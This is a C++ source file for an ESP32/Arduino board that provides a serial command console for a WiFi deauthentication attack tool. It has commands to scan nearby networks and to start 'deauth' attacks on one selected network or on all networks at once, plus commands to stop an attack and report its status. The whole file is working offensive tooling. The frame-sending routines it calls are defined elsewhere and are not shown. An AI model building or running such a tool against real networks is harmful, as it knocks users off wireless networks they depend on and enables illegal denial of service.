#include <Arduino.h>
#include <WiFi.h>
#include "definitions.h"

void serial_interface_handle() {
    static String input = "";
    
    while (Serial.available() > 0) {
        char c = Serial.read();
        if (c == '\n' || c == '\r') {
            input.trim();
            if (input.length() > 0) {
                handle_command(input);
                input = "";
            }
        } else {
            input += c;
        }
    }
}

void handle_command(String cmd) {
    cmd.toLowerCase();
    
    if (cmd == "scan") {
        Serial.println("Scanning networks...");
        scanNetworks();
        delay(5000);
        printNetworks();
    }
    else if (cmd == "show") {
        printNetworks();
    }
    else if (cmd.startsWith("deauth ")) {
        String param = cmd.substring(7);
        param.trim();
        
        if (param == "all") {
            start_deauth(0, DEAUTH_TYPE_ALL, 1);
            Serial.println("Started deauth attack on ALL networks!");
        }
        else {
            int wifi_number = param.toInt();
            if (wifi_number > 0 && wifi_number <= networks.size()) {
                start_deauth(wifi_number - 1, DEAUTH_TYPE_SINGLE, 1);
                Serial.print("Started deauth attack on: ");
                Serial.println(networks[wifi_number - 1].ssid);
            } else {
                Serial.println("Invalid network number!");
            }
        }
    }
    else if (cmd == "stop") {
        stop_deauth();
        Serial.println("Attack stopped!");
    }
    else if (cmd == "status") {
        Serial.printf("Attack Active: %s\n", (deauth_type != DEAUTH_TYPE_NONE) ? "YES" : "NO");
        Serial.printf("Current Channel: %d\n", curr_channel);
        Serial.printf("Networks Found: %d\n", networks.size());
    }
    else if (cmd == "help") {
        Serial.println("Available commands:");
        Serial.println("  scan, show, deauth <n|all>, stop, status, help");
    }
    else {
        Serial.println("Unknown command. Type 'help' for list.");
    }
}
